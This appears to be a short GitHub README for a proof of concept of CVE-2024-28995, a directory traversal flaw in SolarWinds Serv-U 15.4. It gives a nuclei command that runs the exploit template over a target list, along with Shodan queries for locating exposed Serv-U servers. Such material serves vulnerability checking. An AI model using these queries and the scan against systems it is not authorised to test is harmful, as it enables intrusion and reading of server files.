## SolarWinds Serv-U Directory Traversal Vulnerability POC

```
cat targets.txt | nuclei -duc -t CVE-2024-28995.yaml 
```

![image](https://github.com/karkis3c/cves/assets/155802810/8d660d33-9132-49e9-aa51-108aab4d63f1)

## Analysis 
https://t.co/JPCd6Y4v1g

## Shodan Querys

```product:"Rhinosoft Serv-U httpd"```


```http.favicon.hash:"812385209,-494622145,-132641984,-2076792107,-1735578509,-938894035,-741511745,-1109617687,963790560,-1882082933"```

```title:"Serv-U"```

## The following versions of Serv-U are affected, running on either Windows or Linux

- Serv-U FTP Server 15.4
- Serv-U Gateway 15.4
- Serv-U MFT Server 15.4
